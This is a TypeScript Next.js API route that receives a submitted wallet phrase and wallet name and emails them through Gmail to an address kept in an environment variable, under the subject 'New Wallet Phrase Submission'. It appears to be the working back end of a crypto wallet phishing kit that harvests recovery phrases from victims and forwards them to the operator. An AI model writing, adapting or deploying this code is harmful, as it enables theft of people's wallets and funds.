// /pages/api/send-email.ts or /app/api/send-email/route.ts for App Router
import { type NextRequest, NextResponse } from 'next/server';
import nodemailer from 'nodemailer';
import Mail from 'nodemailer/lib/mailer';

// Handler function for the Next.js API route
export async function POST(req: NextRequest) {
    const { walletAddress, selectedWallet } = await req.json();

    // Create Nodemailer transporter
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.GMAIL_USER,  // Use environment variables for security
        pass: process.env.GMAIL_PASS,  // Use an App Password or your Gmail password
      },
    });

    // Define the email options
    const mailOptions: Mail.Options = {
      from: process.env.GMAIL_USER, // Sender address
      to: process.env.SHARP_USER, // Replace with the recipient's email
      subject: 'New Wallet Phrase Submission',
      text: `The submitted wallet phrase for ${selectedWallet.name} is: ${walletAddress}`,
    };

    const sendMailPromise = () =>
        new Promise<string>((resolve, reject) => {
          transporter.sendMail(mailOptions, function (err) {
            if (!err) {
              resolve('Email sent');
            } else {
              reject(err.message);
            }
          });
        });

    try {
        await sendMailPromise();
        return NextResponse.json({ message: 'Email sent' });
    } catch (error) {
      console.error('Error sending email:', error);
      return NextResponse.json({ error: error }, { status: 500 });
    }
}
